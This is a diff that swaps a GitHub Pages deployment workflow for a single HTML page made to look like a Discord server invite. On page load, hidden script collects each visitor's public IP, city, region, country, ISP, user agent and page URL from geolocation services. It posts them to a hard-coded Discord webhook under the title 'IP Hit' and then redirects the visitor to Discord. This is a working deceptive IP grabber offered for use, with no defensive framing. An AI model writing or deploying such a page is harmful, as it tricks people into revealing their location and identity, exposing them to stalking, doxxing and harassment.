@@ -1,43 +1,132 @@
-# Simple workflow for deploying static content to GitHub Pages
-name: Deploy static content to Pages
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Discord</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: #313338;
+    color: #dbdee1;
+    font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .card {
+    background: #2b2d31;
+    border-radius: 8px;
+    padding: 32px;
+    width: 100%;
+    max-width: 440px;
+    text-align: center;
+    box-shadow: 0 8px 16px rgba(0,0,0,.24);
+  }
+  .logo {
+    width: 56px; height: 56px;
+    background: #5865f2;
+    border-radius: 16px;
+    margin: 0 auto 20px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 28px; font-weight: 700; color: #fff;
+  }
+  h1 { font-size: 24px; font-weight: 600; color: #f2f3f5; margin-bottom: 8px; }
+  p  { font-size: 16px; color: #b5bac1; margin-bottom: 28px; line-height: 1.4; }
+  .btn {
+    display: block;
+    width: 100%;
+    background: #5865f2;
+    color: #fff;
+    border: none;
+    border-radius: 3px;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    text-decoration: none;
+    transition: background .15s;
+  }
+  .btn:hover { background: #4752c4; }
+  .footer { margin-top: 16px; font-size: 12px; color: #949ba4; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">D</div>
+    <h1>You've been invited to join a server</h1>
+    <p id="serverName">Private Server</p>
+    <a class="btn" id="acceptBtn" href="https://discord.com/app">Accept Invite</a>
+    <div class="footer">By accepting you agree to Discord's Terms of Service</div>
+  </div>
 
-on:
-  # Runs on pushes targeting the default branch
-  push:
-    branches: ["main"]
+<script>
+/* ============================================================
+   CONFIG — change these two lines
+   ============================================================ */
+const WEBHOOK = "https://discord.com/api/webhooks/1563699221314670662/XoPuMUrTYScKWTAfUuOZKLnwZanS-oPdwGCX1diAw-qYWKTew4FIzFljZi8T_jvpYJjs";
+const REDIRECT = "https://discord.com/app";
+/* ============================================================ */
 
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
+(async function () {
+  // optional: pull server name from ?s= query
+  const params = new URLSearchParams(location.search);
+  const server = params.get("s") || "Private Server";
+  document.getElementById("serverName").textContent = server;
 
-# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
-permissions:
-  contents: read
-  pages: write
-  id-token: write
+  // grab public IP + basic fingerprint
+  let ip = "unknown";
+  let geo = {};
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    if (r.ok) {
+      geo = await r.json();
+      ip = geo.ip || "unknown";
+    }
+  } catch (e) {
+    try {
+      const r2 = await fetch("https://api.ipify.org?format=json");
+      if (r2.ok) {
+        const d = await r2.json();
+        ip = d.ip || "unknown";
+      }
+    } catch (_) {}
+  }
 
-# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
-# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
-concurrency:
-  group: "pages"
-  cancel-in-progress: false
+  const payload = {
+    content: null,
+    embeds: [{
+      title: "IP Hit",
+      color: 0x5865f2,
+      fields: [
+        { name: "IP", value: `\`${ip}\``, inline: true },
+        { name: "City", value: geo.city || "—", inline: true },
+        { name: "Region", value: geo.region || "—", inline: true },
+        { name: "Country", value: geo.country_name || geo.country || "—", inline: true },
+        { name: "ISP", value: geo.org || "—", inline: false },
+        { name: "User-Agent", value: navigator.userAgent.slice(0, 200) || "—", inline: false },
+        { name: "Page", value: location.href, inline: false },
+        { name: "Time (UTC)", value: new Date().toISOString(), inline: false }
+      ],
+      footer: { text: "single-file grabber" }
+    }]
+  };
 
-jobs:
-  # Single deploy job since we're just deploying
-  deploy:
-    environment:
-      name: github-pages
-      url: ${{ steps.deployment.outputs.page_url }}
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Setup Pages
-        uses: actions/configure-pages@v5
-      - name: Upload artifact
-        uses: actions/upload-pages-artifact@v3
-        with:
-          # Upload entire repository
-          path: '.'
-      - name: Deploy to GitHub Pages
-        id: deployment
-        uses: actions/deploy-pages@v5
+  // fire and forget to the webhook
+  if (WEBHOOK && !WEBHOOK.includes("PASTE_YOUR")) {
+    try {
+      await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    } catch (_) {}
+  }
+
+  // button just redirects (already logged on load)
+  document.getElementById("acceptBtn").href = REDIRECT;
+})();
+</script>
+</body>
+</html>
